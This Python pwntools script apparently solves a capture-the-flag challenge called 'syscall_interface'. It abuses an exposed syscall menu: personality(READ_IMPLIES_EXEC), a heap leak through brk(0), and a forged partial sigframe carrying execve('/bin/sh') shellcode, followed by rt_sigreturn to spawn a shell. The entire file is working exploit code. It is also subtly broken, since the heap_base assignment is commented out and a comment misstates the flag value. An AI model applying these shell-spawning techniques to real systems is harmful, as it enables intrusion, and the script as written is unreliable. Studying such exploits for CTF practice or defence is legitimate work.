from pwn import *
context(os="linux", arch="amd64", kernel="amd64")

context.log_level="debug"

g_fname = args.FNAME if args.FNAME else "./syscall_interface"

if args.REMOTE:
    rhost, rport = args.REMOTE.split(":")
    g_io = remote(rhost, int(rport))
else:
    g_io = process(g_fname)

def opt(choice):
    g_io.sendlineafter(b"choice:", str(choice).encode())

def exec_syscall(sysno, arg0):
    opt(0)
    g_io.sendlineafter(b"syscall number:", str(sysno).encode())
    g_io.sendlineafter(b"argument:", str(arg0).encode())

def setname(name):
    opt(1)
    g_io.sendafter(b"username:", name)

def pwn():
    # call system call 'personality(READ_IMPLIES_EXEC)', 
    # READ_IMPLIES_EXEC == 0x4000, it make the mmap() readable segment
    # also executable.
    exec_syscall(int(constants.SYS_personality), 0x400000)

    # brk(0) to leak heap top
    exec_syscall(int(constants.SYS_brk), 0)
    g_io.recvuntil(b"SYSCALL(0xc, 0x0, ...): RET(0x", drop=False)
    # heap_base = int(g_io.recvuntil(b")", drop=True), 16) - 0x21000
    log.success("heap@%#x" % heap_base)
    
    # execve("/bin/sh\0", 0, 0), len of this shellcode is 24 bytes.
    shell_code = asm('''
        push 0x3b
        pop rax
        mov rdx, 0xff978cd091969dd1
        neg rdx
        push rdx
        push rsp
        pop rdi
        cdq
        push rdx
        pop rsi
        syscall
    ''')

    partial_sigframe = flat([
        # start from sigframe.rbp
        shell_code.rjust(0x28, b'\x90'),
        heap_base+0x1000, # sf.rsp
        heap_base+80, # sf.rip
        0, # eflags
        p16(0x33), # cs/gs/fs/ss
        p32(0), # gs/fs
        p16(0x2b)
    ])

    setname(partial_sigframe)
    pause()
    # call any syscall is ok, jsut to invoke the printf to write shellcode to heap
    exec_syscall(0, 0)

    exec_syscall(int(constants.SYS_rt_sigreturn), 0)

if ('__main__' == __name__):
    pwn()
    g_io.interactive()